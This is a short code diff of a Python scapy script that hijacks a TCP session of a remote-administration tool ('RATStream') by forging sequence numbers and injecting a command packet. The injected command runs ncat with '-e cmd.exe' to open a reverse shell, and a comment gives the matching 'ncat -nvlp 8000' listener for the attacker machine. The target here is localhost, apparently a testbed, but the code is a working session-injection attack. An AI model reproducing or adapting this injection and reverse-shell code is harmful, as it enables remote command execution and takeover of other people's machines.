@@ -2,9 +2,10 @@ from scapy.all import sniff, send
 from scapy.layers.inet import IP, TCP
 import struct
 
+# this command creates a reverse shell
 # run a netcat server on attacker machine first
 # ncat -nvlp 8000
-command = "\"C:\\Program Files (x86)\\Nmap\\ncat.exe\" localhost 8000 -e cmd.exe"
+injected_command = "\"C:\\Program Files (x86)\\Nmap\\ncat.exe\" localhost 8000 -e cmd.exe"
 
 class RATStream:
     admin_port: int = -1
@@ -25,9 +26,9 @@ class RATStream:
         tcp_layer.seq = ratstream.most_recent_remote_ack
         tcp_layer.chksum = None
 
-        global command
-        new_packet[TCP].payload.load = struct.pack("I 2044s", 6, command.encode())
+        new_packet[TCP].payload.load = struct.pack("I 2044s", 6, injected_command.encode())
 
+        print("Injecting...")
         send(new_packet[IP], iface='\\Device\\NPF_Loopback')
 
 def decode_message_packet(packet):
